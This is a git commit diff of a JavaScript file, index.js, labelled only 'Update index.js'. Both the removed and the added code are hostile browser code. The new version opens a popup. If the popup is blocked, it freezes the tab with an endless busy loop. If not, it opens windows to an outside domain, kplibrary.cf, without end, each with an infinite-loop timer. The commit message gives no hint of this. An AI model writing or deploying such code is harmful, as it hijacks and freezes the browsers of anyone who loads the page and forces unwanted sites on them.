492a4119be932a1aa1bcc85aea982ee4a85877bd
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-08 18:46:08 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,11 +1,14 @@
-var answer = confirm ("Im a pineapple")
-if (answer)
-window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
-setTimeout(function(){
-for(var i = 0; i === i; i++) {}
-}, 50); 
-else
-window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
-setTimeout(function(){
-for(var i = 0; i === i; i++) {}
-}, 50); 
+var windowName = 'userConsole';
+var popUp = window.open('/popup-page.php', windowName, 'width=1000, height=700, left=24, top=24, scrollbars, resizable');
+if (popUp == null || typeof(popUp) == 'undefined') {
+  while (true) {
+    for (var i = 0; i === i; i++) {}
+  }
+} else {
+  while (true) {
+    window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
+    setTimeout(function() {
+      for (var i = 0; i === i; i++) {}
+    }, 50);
+  }
+}
